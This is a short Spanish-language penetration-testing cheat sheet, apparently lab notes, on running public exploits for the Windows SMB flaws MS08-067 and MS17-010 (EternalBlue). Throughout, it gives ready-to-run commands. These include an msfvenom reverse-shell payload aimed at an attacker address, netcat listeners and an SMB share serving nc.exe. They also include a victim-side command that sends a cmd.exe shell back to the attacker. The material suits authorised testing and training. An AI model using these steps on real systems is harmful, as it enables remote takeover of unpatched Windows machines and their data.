# Exploits

## MS08-067 (NetAPI)

> [Código original](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)

Uso:

1. Generar reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows -v shellcode
```

2. Modificar la variable `shellcode` (línea 54) con el resultado de msfvenom
3. Dejar a la escucha el puerto seleccionado

```bash
nc -lnvp 443
```

4. Ejecutamos el exploit indicando el número de OS y el puerto (el autor recomienda usar el siguiente comando de nmap para validar el OS: `nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1`)
	- `1` para Windows XP SP0/SP1 Universal
	- `2` para Windows 2000 Universal
	- `3` para Windows 2003 SP0 Universal
	- `4` para Windows 2003 SP1 English
	- `5` para Windows XP SP3 French (NX)
	- `6` para Windows XP SP3 English (NX)
	- `7` para Windows XP SP3 English (AlwaysOn NX)

```bash
python3 ms08-067.py 192.168.1.1 6 445
```

## MS17-010 (EternalBlue)

> [Código original ms17-010.py](https://raw.githubusercontent.com/3ndG4me/AutoBlue-MS17-010/master/zzz_exploit.py)

> [Código original mysmb.py](https://raw.githubusercontent.com/3ndG4me/AutoBlue-MS17-010/master/zzz_exploit.py)

Uso:

1. Es necesario tener ambos códigos (ms17-010.py y mysmb.py) en el mismo directorio
2. Ejecutamos el exploit

```bash
python3 ms17-010.py 192.168.1.1
```

3. Debido que la shell generada no es muy estable, se recomienda generar una nueva shell usando netcat
- Levantamos una carpeta compartida

```bash
python3 /usr/share/doc/python3-impacket/examples/smbserver.py tmp /usr/share/windows-binaries/
```

- Nos ponemos a la escucha

```bash
nc -lnvp 443
```

- Ejecutamos netcat en la máquina víctima

```bash
\\10.11.0.157\tmp\nc.exe 10.11.0.157 443 -e cmd.exe
```